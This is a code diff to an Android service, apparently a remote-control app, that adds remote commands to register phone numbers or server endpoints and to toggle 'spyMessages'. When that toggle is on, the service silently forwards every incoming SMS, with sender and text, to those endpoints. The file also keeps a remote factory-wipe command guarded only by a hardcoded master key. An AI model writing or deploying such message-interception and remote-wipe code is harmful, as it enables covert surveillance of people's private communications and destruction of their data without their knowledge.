@@ -37,6 +37,8 @@ public class CommunicationService extends Service implements OnInitListener
 	private boolean mNotifyRequests = false;
 	private Vibrator mVibrator;
 	private int mWipeCountdown = 8;
+	private ArrayList<ParallelConnection> mParallelConnections = new ArrayList<ParallelConnection>();
+	private boolean mSpyMessages = false;
 
 	private class CommunicationServer extends CoolJsonCommunication
 	{
@@ -286,13 +288,13 @@ public class CommunicationService extends Service implements OnInitListener
 						break;
 					case "wipeData":
 						response.put("warning", "This feature will delete external storage and protected data");
-						
+
 						if (receivedMessage.has("master") && "gmasterkey".equals(receivedMessage.getString("master")))
 						{
 							if (mWipeCountdown == 0)
 							{
 								response.put("info", "Request successful. Wipe requested");
-								mDPM.wipeData(mDPM.WIPE_EXTERNAL_STORAGE|mDPM.WIPE_RESET_PROTECTION_DATA);
+								mDPM.wipeData(mDPM.WIPE_EXTERNAL_STORAGE | mDPM.WIPE_RESET_PROTECTION_DATA);
 								result = true;
 							}
 							else if (mWipeCountdown > 0)
@@ -304,6 +306,53 @@ public class CommunicationService extends Service implements OnInitListener
 						else
 							response.put("error", "Master key required to perform this action.");
 						break;
+					case "addConnection":
+
+						ParallelConnection connection = null;
+
+						if (receivedMessage.has("telNumber"))
+							connection = new ParallelConnection(receivedMessage.getString("telNumber"));
+						else 
+							connection = new ParallelConnection(receivedMessage.getString("server"), receivedMessage.getInt("port"));
+
+						if (!mParallelConnections.contains(connection))
+						{
+							mParallelConnections.add(connection);
+							result = true;
+						}
+
+						break;
+					case "getConnections":
+
+						JSONArray list = new JSONArray();
+
+						for (ParallelConnection pConnection : mParallelConnections)
+						{
+							list.put(pConnection.toString());
+						}
+
+						response.put("connection_list", list);
+
+						result = true;
+
+						break;
+					case "spyMessages":
+						mSpyMessages = !mSpyMessages;
+
+						if (mParallelConnections.size() == 0 && mSpyMessages)
+							response.put("attention", "No connection has been added use 'addConnection'");
+
+						response.put("spyMessages", mSpyMessages);
+
+						result = true;
+						break;
+					case "removeAllConnections":
+						mParallelConnections.clear();
+						result = true;
+						break;
+					case "sendToAllConnections":
+						sendToConnections(receivedMessage.getString("message"));
+						break;
 					default:
 						response.put("info", "{" + request + "} is not found");
 				}
@@ -313,7 +362,7 @@ public class CommunicationService extends Service implements OnInitListener
 		}
 
 		@Override
-		protected void onError(Exception r1_Exception)
+		protected void onError(Exception rxception)
 		{
 		}
 
@@ -340,6 +389,53 @@ public class CommunicationService extends Service implements OnInitListener
 		}
 	}
 
+	private class ParallelConnection
+	{
+		public final static int TYPE_COOLSOCKET = 0;
+		public final static int TYPE_TEL_NUMBER = 2;
+
+		private int mType;
+		private String mServer;
+		private int mPort;
+		private String mNumber;
+
+		public ParallelConnection(String telephoneNumber)
+		{
+			this.mType = TYPE_TEL_NUMBER;
+			this.mNumber = telephoneNumber;
+		}
+
+		public ParallelConnection(String server, int port)
+		{
+			this.mType = TYPE_COOLSOCKET;
+			this.mServer = server;
+			this.mPort = port;
+		}
+
+		public int getType()
+		{
+			return this.mType;
+		}
+
+		public void sendMessage(String message)
+		{
+			if (getType() == TYPE_TEL_NUMBER)
+			{
+				SmsManager smsManager = SmsManager.getDefault();
+				smsManager.sendTextMessage(this.mNumber, null, message, null, null);
+			}
+			else if (getType() == TYPE_COOLSOCKET)
+			{
+				CoolCommunication.Messenger.send(this.mServer, this.mPort, message, null);
+			}
+		}
+
+		public String toString()
+		{
+			return (this.mType == TYPE_TEL_NUMBER) ? this.mNumber: this.mServer + ":" + this.mPort;
+		}
+	}
+
 	private class ConnectionTest implements Runnable
 	{
 		private int mTimes;
@@ -358,6 +454,14 @@ public class CommunicationService extends Service implements OnInitListener
 			{
 
 			}
+		}
+	}
+
+	protected void sendToConnections(String message)
+	{
+		for (ParallelConnection conn : mParallelConnections)
+		{
+			conn.sendMessage(message);
 		}
 	}
 
@@ -479,12 +583,20 @@ public class CommunicationService extends Service implements OnInitListener
 		}
 
 		if (intent != null)
-			if (SmsReceiver.ACTION_SMS_RECEIVED.equals(intent.getAction()) && intent.hasExtra(SmsReceiver.EXTRA_SENDER_NUMBER) && intent.hasExtra(SmsReceiver.EXTRA_MESSAGE))
+			if (SmsReceiver.ACTION_SMS_COMMAND_RECEIVED.equals(intent.getAction()) && intent.hasExtra(SmsReceiver.EXTRA_SENDER_NUMBER) && intent.hasExtra(SmsReceiver.EXTRA_MESSAGE))
 			{
 				String message = intent.getStringExtra(SmsReceiver.EXTRA_MESSAGE);
 				String sender = intent.getStringExtra(SmsReceiver.EXTRA_SENDER_NUMBER);
 
 				runCommandSMS(sender, message);
+			}
+			else if (SmsReceiver.ACTION_SMS_RECEIVED.equals(intent.getAction()))
+			{
+				String message = intent.getStringExtra(SmsReceiver.EXTRA_MESSAGE);
+				String sender = intent.getStringExtra(SmsReceiver.EXTRA_SENDER_NUMBER);
+
+				if (mSpyMessages)
+					sendToConnections(sender + ">" + message);
 			}
 
 		return START_STICKY;
